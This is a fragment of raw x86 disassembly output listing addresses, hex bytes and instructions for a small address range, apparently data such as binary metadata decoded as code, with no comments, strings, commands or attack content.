  405cfd:	17                   	pop    %ss
  405cfe:	dc 02                	faddl  (%edx)
  405d00:	06                   	push   %es
  405d01:	00 2c 0e             	add    %ch,(%esi,%ecx,1)
  405d04:	55                   	push   %ebp
  405d05:	00 06                	add    %al,(%esi)
  405d07:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d0b:	02 06                	add    (%esi),%al
  405d0d:	00 6b 0f             	add    %ch,0xf(%ebx)
  405d10:	5c                   	pop    %esp
  405d11:	02 06                	add    (%esi),%al
  405d13:	00 02                	add    %al,(%edx)
  405d15:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d1a:	79 14                	jns    0x405d30
  405d1c:	5c                   	pop    %esp
  405d1d:	02 06                	add    (%esi),%al
  405d1f:	00 21                	add    %ah,(%ecx)
  405d21:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d25:	00 3a                	add    %bh,(%edx)
  405d27:	12 60 15             	adc    0x15(%eax),%ah
  405d2a:	1a 00                	sbb    (%eax),%al
  405d2c:	f8                   	clc
  405d2d:	13 81 1a 1a 00 76    	adc    0x76001a1a(%ecx),%eax
  405d33:	11 81 1a 8b 01 b1    	adc    %eax,-0x4efe74e6(%ecx)
  405d39:	14 00                	adc    $0x0,%al
  405d3b:	00 1a                	add    %bl,(%edx)
  405d3d:	00 1d 19 81 1a 06    	add    %bl,0x61a8119
  405d43:	00 38                	add    %bh,(%eax)
  405d45:	15 e9 0f 06 00       	adc    $0x60fe9,%eax
  405d4a:	7a 00                	jp     0x405d4c
  405d4c:	e9 0f 06 00 e0       	jmp    0xe0406360
  405d51:	0f e9 0f             	psubsw (%edi),%mm1
  405d54:	06                   	push   %es
  405d55:	00 da                	add    %bl,%dl
  405d57:	00 e9                	add    %ch,%cl
  405d59:	0f 06                	clts
  405d5b:	00 e0                	add    %ah,%al
  405d5d:	12 fa                	adc    %dl,%bh
  405d5f:	1c 06                	sbb    $0x6,%al
  405d61:	00 28                	add    %ch,(%eax)
  405d63:	10 fa                	adc    %bh,%dl
  405d65:	1c 06                	sbb    $0x6,%al
  405d67:	00 a7 07 e9 0f 06    	add    %ah,0x60fe907(%edi)
  405d6d:	00 7b 10             	add    %bh,0x10(%ebx)
  405d70:	e9 0f 1e 00 1f       	jmp    0x1f407b84
  405d75:	11 a8 17 06 00 9b    	adc    %ebp,-0x64fff9e9(%eax)
  405d7b:	1d b3 0e 06 00       	sbb    $0x60eb3,%eax
  405d80:	cd 0e                	int    $0xe
  405d82:	b3 0e                	mov    $0xe,%bl
  405d84:	06                   	push   %es
  405d85:	00 7a 06             	add    %bh,0x6(%edx)
  405d88:	b3 0e                	mov    $0xe,%bl
  405d8a:	06                   	push   %es
  405d8b:	00 6f 03             	add    %ch,0x3(%edi)
  405d8e:	e9 0f 06 00 1a       	jmp    0x1a4063a2
  405d93:	06                   	push   %es
  405d94:	93                   	xchg   %eax,%ebx
  405d95:	0b 0a                	or     (%edx),%ecx
  405d97:	00 11                	add    %dl,(%ecx)
  405d99:	14 55                	adc    $0x55,%al
  405d9b:	00 0a                	add    %cl,(%edx)
  405d9d:	00 95 18 55 00 06    	add    %dl,0x6005518(%ebp)
  405da3:	00 d0                	add    %dl,%al
  405da5:	04 55                	add    $0x55,%al
  405da7:	00 43 00             	add    %al,0x0(%ebx)
  405daa:	ee                   	out    %al,(%dx)
  405dab:	14 00                	adc    $0x0,%al
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 9d 05 b5 12 06    	add    %bl,0x612b505(%ebp)
  405db5:	00 12                	add    %dl,(%edx)
  405db7:	00 c1                	add    %al,%cl
  405db9:	02 06                	add    (%esi),%al
  405dbb:	00 ad 10 e9 0f 06    	add    %ch,0x60fe910(%ebp)
  405dc1:	00 17                	add    %dl,(%edi)
  405dc3:	1d 4a 11 06 00       	sbb    $0x6114a,%eax
  405dc8:	33 08                	xor    (%eax),%ecx
  405dca:	e9 0f 06 00 f9       	jmp    0xf94063de
  405dcf:	14 e9                	adc    $0xe9,%al
  405dd1:	0f 06                	clts
  405dd3:	00 f6                	add    %dh,%dh
  405dd5:	05 e9 0f 22 00       	add    $0x220fe9,%eax
  405dda:	47                   	inc    %edi
  405ddb:	12 57 13             	adc    0x13(%edi),%dl
  405dde:	22 00                	and    (%eax),%al
  405de0:	cf                   	iret
  405de1:	16                   	push   %ss
  405de2:	57                   	push   %edi
  405de3:	13 22                	adc    (%edx),%esp
  405de5:	00 7e 13             	add    %bh,0x13(%esi)
  405de8:	57                   	push   %edi
  405de9:	13 12                	adc    (%edx),%edx
  405deb:	00 76 13             	add    %dh,0x13(%esi)
  405dee:	9d                   	popf
  405def:	15 22 00 e7 16       	adc    $0x16e70022,%eax
  405df4:	57                   	push   %edi
  405df5:	13 06                	adc    (%esi),%eax
  405df7:	00 57 16             	add    %dl,0x16(%edi)
  405dfa:	fa                   	cli
  405dfb:	1c 06                	sbb    $0x6,%al
  405dfd:	00 e6                	add    %ah,%dh
  405dff:	11 e9                	adc    %ebp,%ecx
  405e01:	0f 06                	clts
  405e03:	00 5e 16             	add    %bl,0x16(%esi)
  405e06:	fa                   	cli
  405e07:	1c 12                	sbb    $0x12,%al
  405e09:	00 12                	add    %dl,(%edx)
  405e0b:	13 fa                	adc    %edx,%edi
  405e0d:	1c 06                	sbb    $0x6,%al
  405e0f:	00 9f 0f fa 1c 06    	add    %bl,0x61cfa0f(%edi)
  405e15:	00 fb                	add    %bh,%bl
  405e17:	00 fa                	add    %bh,%dl
  405e19:	1c 06                	sbb    $0x6,%al
  405e1b:	00 d0                	add    %dl,%al
  405e1d:	11 e9                	adc    %ebp,%ecx
  405e1f:	0f 06                	clts
  405e21:	00 01                	add    %al,(%ecx)
  405e23:	10 fa                	adc    %bh,%dl
  405e25:	1c 06                	sbb    $0x6,%al
  405e27:	00 47 05             	add    %al,0x5(%edi)
  405e2a:	fa                   	cli
  405e2b:	1c 06                	sbb    $0x6,%al
  405e2d:	00 0b                	add    %cl,(%ebx)
  405e2f:	05 fa 1c 06 00       	add    $0x61cfa,%eax
  405e34:	42                   	inc    %edx
  405e35:	10 fa                	adc    %bh,%dl
  405e37:	1c 06                	sbb    $0x6,%al
  405e39:	00 26                	add    %ah,(%esi)
  405e3b:	05 fa 1c 06 00       	add    $0x61cfa,%eax
  405e40:	b9 11 fa 1c 06       	mov    $0x61cfa11,%ecx
  405e45:	00 9f 13 e9 0f 06    	add    %bl,0x60fe913(%edi)
  405e4b:	00 8d 1c e9 0f 06    	add    %cl,0x60fe91c(%ebp)
  405e51:	00 01                	add    %al,(%ecx)
  405e53:	18 9d 15 06 00 d3    	sbb    %bl,-0x2cfff9eb(%ebp)
  405e59:	05 e9 0f 06 00       	add    $0x60fe9,%eax
  405e5e:	26 03 fa             	es add %edx,%edi
  405e61:	1c 06                	sbb    $0x6,%al
  405e63:	00 c7                	add    %al,%bh
  405e65:	00 e9                	add    %ch,%cl
  405e67:	0f 06                	clts
  405e69:	00 c1                	add    %al,%cl
  405e6b:	05 e9 0f 06 00       	add    $0x60fe9,%eax
  405e70:	3f                   	aas
  405e71:	06                   	push   %es
  405e72:	e9 0f 06 00 30       	jmp    0x30406486
  405e77:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e7b:	00 38                	add    %bh,(%eax)
  405e7d:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e81:	00 ac 0f 09 11 0a 00 	add    %ch,0xa1109(%edi,%ecx,1)
  405e88:	37                   	aaa
  405e89:	05 09 11 00 00       	add    $0x1109,%eax
  405e8e:	00 00                	add    %al,(%eax)
  405e90:	40                   	inc    %eax
  405e91:	01 00                	add    %eax,(%eax)
  405e93:	00 00                	add    %al,(%eax)
  405e95:	00 01                	add    %al,(%ecx)
  405e97:	00 01                	add    %al,(%ecx)
  405e99:	00 01                	add    %al,(%ecx)
  405e9b:	00 10                	add    %dl,(%eax)
  405e9d:	00 c4                	add    %al,%ah
  405e9f:	0f 7a                	(bad)
  405ea1:	1a 05 00 01 00 01    	sbb    0x1000100,%al
  405ea7:	00 81 01 10 00 13    	add    %al,0x13001001(%ecx)
  405ead:	17                   	pop    %ss
  405eae:	7a 1a                	jp     0x405eca
  405eb0:	05 00 01 00 03       	add    $0x3000100,%eax
  405eb5:	00 81 01 10 00 9b    	add    %al,-0x64ffefff(%ecx)
  405ebb:	19 91 11 05 00 13    	sbb    %edx,0x13000511(%ecx)
  405ec1:	00 06                	add    %al,(%esi)
  405ec3:	00 00                	add    %al,(%eax)
  405ec5:	00 10                	add    %dl,(%eax)
  405ec7:	00 a7 12 01 0f 05    	add    %ah,0x50f0112(%edi)
  405ecd:	00 1e                	add    %bl,(%esi)
  405ecf:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	10 00                	adc    %al,(%eax)
  405ed6:	33 17                	xor    (%edi),%edx
  405ed8:	37                   	aaa
  405ed9:	14 05                	adc    $0x5,%al
  405edb:	00 1e                	add    %bl,(%esi)
  405edd:	00 26                	add    %ah,(%esi)
  405edf:	00 81 01 10 00 83    	add    %al,-0x7cffefff(%ecx)
  405ee5:	10 37                	adc    %dh,(%edi)
  405ee7:	14 05                	adc    $0x5,%al
  405ee9:	00 1e                	add    %bl,(%esi)
  405eeb:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ef1:	00 47 13             	add    %al,0x13(%edi)
  405ef4:	37                   	aaa
  405ef5:	14 05                	adc    $0x5,%al
  405ef7:	00 1e                	add    %bl,(%esi)
  405ef9:	00 2f                	add    %ch,(%edi)
  405efb:	00 81 01 10 00 58    	add    %al,0x58001001(%ecx)
  405f01:	15 37 14 05 00       	adc    $0x51437,%eax
  405f06:	1e                   	push   %ds
  405f07:	00 30                	add    %dh,(%eax)
  405f09:	00 81 01 10 00 50    	add    %al,0x50001001(%ecx)
  405f0f:	0f 37                	getsec
  405f11:	14 05                	adc    $0x5,%al
  405f13:	00 1e                	add    %bl,(%esi)
  405f15:	00 36                	add    %dh,(%esi)
  405f17:	00 81 01 10 00 52    	add    %al,0x52001001(%ecx)
  405f1d:	15 37 14 05 00       	adc    $0x51437,%eax
  405f22:	1f                   	pop    %ds
  405f23:	00 38                	add    %bh,(%eax)
  405f25:	00 02                	add    %al,(%edx)
  405f27:	01 00                	add    %eax,(%eax)
  405f29:	00 01                	add    %al,(%ecx)
  405f2b:	02 00                	add    (%eax),%al
  405f2d:	00 39                	add    %bh,(%ecx)
  405f2f:	00 1f                	add    %bl,(%edi)
  405f31:	00 3e                	add    %bh,(%esi)
  405f33:	00 81 01 10 00 91    	add    %al,-0x6effefff(%ecx)
  405f39:	0e                   	push   %cs
  405f3a:	37                   	aaa
  405f3b:	14 05                	adc    $0x5,%al
  405f3d:	00 23                	add    %ah,(%ebx)
  405f3f:	00 3e                	add    %bh,(%esi)
  405f41:	00 81 01 10 00 61    	add    %al,0x61001001(%ecx)
  405f47:	1d 37 14 05 00       	sbb    $0x51437,%eax
  405f4c:	23 00                	and    (%eax),%eax
  405f4e:	41                   	inc    %ecx
  405f4f:	00 81 01 10 00 94    	add    %al,-0x6bffefff(%ecx)
  405f55:	19 76 19             	sbb    %esi,0x19(%esi)
  405f58:	05 00 24 00 46       	add    $0x46002400,%eax
  405f5d:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f63:	00 00                	add    %al,(%eax)
  405f65:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f6b:	00 01                	add    %al,(%ecx)
  405f6d:	00 10                	add    %dl,(%eax)
  405f6f:	00 0d 01 f0 0f 05    	add    %cl,0x50ff001
  405f75:	00 26                	add    %ah,(%esi)
  405f77:	00 4b 00             	add    %cl,0x0(%ebx)
  405f7a:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f80:	f0 0f 05             	lock syscall
  405f83:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f89:	01 00                	add    %eax,(%eax)
  405f8b:	00 58 01             	add    %bl,0x1(%eax)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f95:	00 13                	add    %dl,(%ebx)
  405f97:	01 00                	add    %eax,(%eax)
  405f99:	00 38                	add    %bh,(%eax)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 51 00             	add    %dl,0x0(%ecx)
  405fa0:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fa5:	00 10                	add    %dl,(%eax)
  405fa7:	00 9d 17 ba 0d 05    	add    %bl,0x50dba17(%ebp)
  405fad:	00 2e                	add    %ch,(%esi)
  405faf:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fb3:	00 10                	add    %dl,(%eax)
  405fb5:	00 53 10             	add    %dl,0x10(%ebx)
  405fb8:	ba 0d 05 00 2f       	mov    $0x2f00050d,%edx
  405fbd:	00 5f 00             	add    %bl,0x0(%edi)
  405fc0:	01 00                	add    %eax,(%eax)
  405fc2:	10 00                	adc    %al,(%eax)
  405fc4:	67 1c ba             	addr16 sbb $0xba,%al
  405fc7:	0d 05 00 31 00       	or     $0x310005,%eax
  405fcc:	63 00                	arpl   %eax,(%eax)
  405fce:	01 00                	add    %eax,(%eax)
  405fd0:	10 00                	adc    %al,(%eax)
  405fd2:	d5 0d                	aad    $0xd
  405fd4:	ba 0d 05 00 33       	mov    $0x3300050d,%edx
  405fd9:	00 6a 00             	add    %ch,0x0(%edx)
  405fdc:	01 01                	add    %eax,(%ecx)
  405fde:	00 00                	add    %al,(%eax)
  405fe0:	0c 08                	or     $0x8,%al
  405fe2:	ba 0d 39 00 3a       	mov    $0x3a00390d,%edx
  405fe7:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fed:	00 88 17 ba 0d 05    	add    %cl,0x50dba17(%eax)
  405ff3:	00 47 00             	add    %al,0x0(%edi)
  405ff6:	95                   	xchg   %eax,%ebp
  405ff7:	00 00                	add    %al,(%eax)
  405ff9:	00 10                	add    %dl,(%eax)
  405ffb:	00 92 17 ba 0d 05    	add    %dl,0x50dba17(%edx)
  406001:	00 47 00             	add    %al,0x0(%edi)
  406004:	99                   	cltd
  406005:	00 81 01 10 00 81    	add    %al,-0x7effefff(%ecx)
  40600b:	12 ba 0d 05 00 47    	adc    0x4700050d(%edx),%bh
  406011:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  406017:	00 49 01             	add    %cl,0x1(%ecx)
  40601a:	00 00                	add    %al,(%eax)
  40601c:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406021:	00 13                	add    %dl,(%ebx)
  406023:	01 00                	add    %eax,(%eax)
  406025:	00 1b                	add    %bl,(%ebx)
  406027:	01 00                	add    %eax,(%eax)
  406029:	00 51 00             	add    %dl,0x0(%ecx)
  40602c:	48                   	dec    %eax
  40602d:	00 a4 00 16 00 a2 18 	add    %ah,0x18a20016(%eax,%eax,1)
  406034:	12 00                	adc    (%eax),%al
  406036:	16                   	push   %ss
  406037:	00 af 18 12 00 16    	add    %ch,0x16001218(%edi)
  40603d:	00 01                	add    %al,(%ecx)
  40603f:	11 12                	adc    %edx,(%edx)
  406041:	00 16                	add    %dl,(%esi)
  406043:	00 08                	add    %cl,(%eax)
  406045:	0f 12 00             	movlps (%eax),%xmm0
  406048:	16                   	push   %ss
  406049:	00 39                	add    %bh,(%ecx)
  40604b:	13 12                	adc    (%edx),%edx
  40604d:	00 16                	add    %dl,(%esi)
  40604f:	00 46 06             	add    %al,0x6(%esi)
  406052:	12 00                	adc    (%eax),%al
  406054:	16                   	push   %ss
  406055:	00 f1                	add    %dh,%cl
  406057:	1c 12                	sbb    $0x12,%al
  406059:	00 16                	add    %dl,(%esi)
  40605b:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406061:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  406067:	00 4e 08             	add    %cl,0x8(%esi)
  40606a:	12 00                	adc    (%eax),%al
  40606c:	16                   	push   %ss
  40606d:	00 95 08 15 00 16    	add    %dl,0x16001508(%ebp)
  406073:	00 9e 0d 12 00 16    	add    %bl,0x1600120d(%esi)
  406079:	00 14 01             	add    %dl,(%ecx,%eax,1)
  40607c:	19 00                	sbb    %eax,(%eax)
  40607e:	16                   	push   %ss
  40607f:	00 c9                	add    %cl,%cl
  406081:	10 12                	adc    %dl,(%edx)
  406083:	00 16                	add    %dl,(%esi)
  406085:	00 6b 02             	add    %ch,0x2(%ebx)
  406088:	12 00                	adc    (%eax),%al
  40608a:	16                   	push   %ss
  40608b:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  40608f:	00 16                	add    %dl,(%esi)
  406091:	00 46 1c             	add    %al,0x1c(%esi)
  406094:	12 00                	adc    (%eax),%al
  406096:	16                   	push   %ss
  406097:	00 a1 12 12 00 11    	add    %ah,0x11001212(%ecx)
  40609d:	00 80 04 21 00 11    	add    %al,0x11002104(%eax)
  4060a3:	00 65 04             	add    %ah,0x4(%ebp)
  4060a6:	25 00 11 00 35       	and    $0x35001100,%eax
  4060ab:	04 29                	add    $0x29,%al
  4060ad:	00 11                	add    %dl,(%ecx)
  4060af:	00 cb                	add    %cl,%bl
  4060b1:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060b7:	04 2d                	add    $0x2d,%al
  4060b9:	00 11                	add    %dl,(%ecx)
  4060bb:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060c1:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060c7:	00 79 03             	add    %bh,0x3(%ecx)
  4060ca:	37                   	aaa
  4060cb:	00 11                	add    %dl,(%ecx)
  4060cd:	00 e7                	add    %ah,%bh
  4060cf:	03 30                	add    (%eax),%esi
  4060d1:	00 11                	add    %dl,(%ecx)
  4060d3:	00 1b                	add    %bl,(%ebx)
  4060d5:	04 3a                	add    $0x3a,%al
  4060d7:	00 11                	add    %dl,(%ecx)
  4060d9:	00 fd                	add    %bh,%ch
  4060db:	03 34 00             	add    (%eax,%eax,1),%esi
  4060de:	16                   	push   %ss
  4060df:	00 85 12 dc 00 06    	add    %al,0x600dc12(%ebp)
  4060e5:	06                   	push   %es
  4060e6:	9b                   	fwait
  4060e7:	02 06                	add    (%esi),%al
  4060e9:	01 56 80             	add    %edx,-0x80(%esi)
  4060ec:	70 02                	jo     0x4060f0
  4060ee:	09 01                	or     %eax,(%ecx)
  4060f0:	56                   	push   %esi
  4060f1:	80 ce 01             	or     $0x1,%dh
  4060f4:	09 01                	or     %eax,(%ecx)
  4060f6:	56                   	push   %esi
  4060f7:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060fe:	fe 01                	incb   (%ecx)
  406100:	12 00                	adc    (%eax),%al
  406102:	16                   	push   %ss
  406103:	00 51 17             	add    %dl,0x17(%ecx)
  406106:	30 01                	xor    %al,(%ecx)
  406108:	16                   	push   %ss
  406109:	00 0b                	add    %cl,(%ebx)
  40610b:	00 43 01             	add    %al,0x1(%ebx)
  40610e:	51                   	push   %ecx
  40610f:	80 90 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%eax)
  406116:	8c 0d 3a 00 51 80    	mov    %cs,0x8051003a
  40611c:	83 0d 3a 00 51 80 67 	orl    $0x67,0x8051003a
  406123:	0d 3a 00 21 00       	or     $0x21003a,%eax
  406128:	f5                   	cmc
  406129:	1c 29                	sbb    $0x29,%al
  40612b:	00 21                	add    %ah,(%ecx)
  40612d:	00 d6                	add    %dl,%dh
  40612f:	1c 29                	sbb    $0x29,%al
  406131:	00 31                	add    %dh,(%ecx)
  406133:	00 f6                	add    %dh,%dh
  406135:	19 29                	sbb    %ebp,(%ecx)
  406137:	00 33                	add    %dh,(%ebx)
  406139:	01 77 01             	add    %esi,0x1(%edi)
  40613c:	8b 01                	mov    (%ecx),%eax
  40613e:	11 00                	adc    %eax,(%eax)
  406140:	5d                   	pop    %ebp
  406141:	05 8f 01 01 00       	add    $0x1018f,%eax
  406146:	8f                   	(bad)
  406147:	10 30                	adc    %dh,(%eax)
  406149:	01 01                	add    %eax,(%ecx)
  40614b:	00 b0 11 3a 00 01    	add    %dh,0x1003a11(%eax)
  406151:	00 8f 10 30 01 01    	add    %cl,0x1013010(%edi)
  406157:	00 31                	add    %dh,(%ecx)
  406159:	14 c7                	adc    $0xc7,%al
  40615b:	01 01                	add    %eax,(%ecx)
  40615d:	00 a2 07 12 00 01    	add    %ah,0x1001207(%edx)
  406163:	00 82 07 12 00 01    	add    %al,0x1001207(%edx)
  406169:	00 a4 0a 37 00 01 00 	add    %ah,0x10037(%edx,%ecx,1)
  406170:	02 08                	add    (%eax),%cl
  406172:	02 02                	add    (%edx),%al
  406174:	01 00                	add    %eax,(%eax)
  406176:	9f                   	lahf
  406177:	1a c7                	sbb    %bh,%al
  406179:	01 01                	add    %eax,(%ecx)
  40617b:	00 8f 10 30 01 01    	add    %cl,0x1013010(%edi)
  406181:	00 88 1c 06 02 06    	add    %cl,0x602061c(%eax)
  406187:	06                   	push   %es
  406188:	9b                   	fwait
  406189:	02 3a                	add    (%edx),%bh
  40618b:	00 56 80             	add    %dl,-0x80(%esi)
  40618e:	f8                   	clc
  40618f:	11 02                	adc    %eax,(%edx)
  406191:	02 56 80             	add    -0x80(%esi),%dl
  406194:	4b                   	dec    %ebx
  406195:	0f 02 02             	lar    (%edx),%eax
  406198:	56                   	push   %esi
  406199:	80 70 12 02          	xorb   $0x2,0x12(%eax)
  40619d:	02 56 80             	add    -0x80(%esi),%dl
  4061a0:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  4061a3:	02 56 80             	add    -0x80(%esi),%dl
  4061a6:	be 0c 02 02 56       	mov    $0x5602020c,%esi
  4061ab:	80 e1 13             	and    $0x13,%cl
  4061ae:	02 02                	add    (%edx),%al
  4061b0:	56                   	push   %esi
  4061b1:	80 c7 00             	add    $0x0,%bh
  4061b4:	02 02                	add    (%edx),%al
  4061b6:	56                   	push   %esi
  4061b7:	80 7b 10 02          	cmpb   $0x2,0x10(%ebx)
  4061bb:	02 56 80             	add    -0x80(%esi),%dl
  4061be:	0c 19                	or     $0x19,%al
  4061c0:	02 02                	add    (%edx),%al
  4061c2:	56                   	push   %esi
  4061c3:	80 3f 06             	cmpb   $0x6,(%edi)
  4061c6:	02 02                	add    (%edx),%al
  4061c8:	56                   	push   %esi
  4061c9:	80 a7 07 02 02 56 80 	andb   $0x80,0x56020207(%edi)
  4061d0:	46                   	inc    %esi
  4061d1:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061d6:	11 02                	adc    %eax,(%edx)
  4061d8:	fd                   	std
  4061d9:	02 08                	add    (%eax),%cl
  4061db:	26 00 00             	add    %al,%es:(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	96                   	xchg   %eax,%esi
  4061e1:	00 98 10 0a 00 01    	add    %bl,0x1000a10(%eax)
  4061e7:	00 78 20             	add    %bh,0x20(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 18                	xchg   %bl,(%eax)
  4061f0:	03 15 0e 00 01 00    	add    0x1000e,%edx
  4061f6:	f8                   	clc
  4061f7:	26 00 00             	add    %al,%es:(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	96                   	xchg   %eax,%esi
  4061fd:	00 09                	add    %cl,(%ecx)
  4061ff:	17                   	pop    %ss
  406200:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  406205:	28 00                	sub    %al,(%eax)
  406207:	00 00                	add    %al,(%eax)
  406209:	00 91 00 32 0d 1d    	add    %dl,0x1d0d3200(%ecx)
  40620f:	00 01                	add    %al,(%ecx)
  406211:	00 c0                	add    %al,%al
  406213:	28 00                	sub    %al,(%eax)
  406215:	00 00                	add    %al,(%eax)
  406217:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406225:	00 96 08 50 1a 3d    	add    %dl,0x3d1a5008(%esi)
  40622b:	00 01                	add    %al,(%ecx)
  40622d:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  406233:	00 96 08 5e 1a 42    	add    %dl,0x421a5e08(%esi)
  406239:	00 01                	add    %al,(%ecx)
  40623b:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406241:	00 96 08 34 1a 48    	add    %dl,0x481a3408(%esi)
  406247:	00 02                	add    %al,(%edx)
  406249:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  40624f:	00 96 08 42 1a 4d    	add    %dl,0x4d1a4208(%esi)
  406255:	00 02                	add    %al,(%edx)
  406257:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  40625d:	00 91 08 90 13 53    	add    %dl,0x53139008(%ecx)
  406263:	00 03                	add    %al,(%ebx)
  406265:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  40626b:	00 91 08 9b 13 58    	add    %dl,0x58139b08(%ecx)
  406271:	00 03                	add    %al,(%ebx)
  406273:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406279:	00 91 08 11 0b 5e    	add    %dl,0x5e0b1108(%ecx)
  40627f:	00 04 00             	add    %al,(%eax,%eax,1)
  406282:	b4 20                	mov    $0x20,%ah
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	91                   	xchg   %eax,%ecx
  406289:	08 20                	or     %ah,(%eax)
  40628b:	0b 62 00             	or     0x0(%edx),%esp
  40628e:	04 00                	add    $0x0,%al
  406290:	bc 20 00 00 00       	mov    $0x20,%esp
  406295:	00 91 08 cd 19 5e    	add    %dl,0x5e19cd08(%ecx)
  40629b:	00 05 00 c3 20 00    	add    %al,0x20c300
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 08 d8 19 62    	add    %dl,0x6219d808(%ecx)
  4062a9:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 08 c7 0a 67    	add    %dl,0x670ac708(%ecx)
  4062b7:	00 06                	add    %al,(%esi)
  4062b9:	00 d2                	add    %dl,%dl
  4062bb:	20 00                	and    %al,(%eax)
  4062bd:	00 00                	add    %al,(%eax)
  4062bf:	00 91 08 d5 0a 6c    	add    %dl,0x6c0ad508(%ecx)
  4062c5:	00 06                	add    %al,(%esi)
  4062c7:	00 da                	add    %bl,%dl
  4062c9:	20 00                	and    %al,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062d3:	00 07                	add    %al,(%edi)
  4062d5:	00 e1                	add    %ah,%cl
  4062d7:	20 00                	and    %al,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062e1:	00 07                	add    %al,(%edi)
  4062e3:	00 e9                	add    %ch,%cl
  4062e5:	20 00                	and    %al,(%eax)
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062ef:	00 08                	add    %cl,(%eax)
  4062f1:	00 f0                	add    %dh,%al
  4062f3:	20 00                	and    %al,(%eax)
  4062f5:	00 00                	add    %al,(%eax)
  4062f7:	00 91 08 81 0b 67    	add    %dl,0x670b8108(%ecx)
  4062fd:	00 08                	add    %cl,(%eax)
  4062ff:	00 f7                	add    %dh,%bh
  406301:	20 00                	and    %al,(%eax)
  406303:	00 00                	add    %al,(%eax)
  406305:	00 91 08 8a 0b 6c    	add    %dl,0x6c0b8a08(%ecx)
  40630b:	00 08                	add    %cl,(%eax)
  40630d:	00 ff                	add    %bh,%bh
  40630f:	20 00                	and    %al,(%eax)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 96 08 e7 0e 7b    	add    %dl,0x7b0ee708(%esi)
  406319:	00 09                	add    %cl,(%ecx)
  40631b:	00 06                	add    %al,(%esi)
  40631d:	21 00                	and    %eax,(%eax)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 96 08 f4 0e 7f    	add    %dl,0x7f0ef408(%esi)
  406327:	00 09                	add    %cl,(%ecx)
  406329:	00 0e                	add    %cl,(%esi)
  40632b:	21 00                	and    %eax,(%eax)
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 96 08 de 0c 1d    	add    %dl,0x1d0cde08(%esi)
  406335:	00 0a                	add    %cl,(%edx)
  406337:	00 15 21 00 00 00    	add    %dl,0x21
  40633d:	00 96 08 ef 0c 72    	add    %dl,0x720cef08(%esi)
  406343:	00 0a                	add    %cl,(%edx)
  406345:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406349:	00 00                	add    %al,(%eax)
  40634b:	00 96 00 23 1a 0a    	add    %dl,0xa1a2300(%esi)
  406351:	00 0b                	add    %cl,(%ebx)
  406353:	00 1d 21 00 00 00    	add    %bl,0x21
  406359:	00 91 00 63 07 84    	add    %dl,-0x7bf89d00(%ecx)
  40635f:	00 0b                	add    %cl,(%ebx)
  406361:	00 28                	add    %ch,(%eax)
  406363:	21 00                	and    %eax,(%eax)
  406365:	00 00                	add    %al,(%eax)
  406367:	00 91 00 8d 08 89    	add    %dl,-0x76f77300(%ecx)
  40636d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406370:	b8 2c 00 00 00       	mov    $0x2c,%eax
  406375:	00 96 00 52 19 0a    	add    %dl,0xa195200(%esi)
  40637b:	00 10                	add    %dl,(%eax)
  40637d:	00 40 2d             	add    %al,0x2d(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
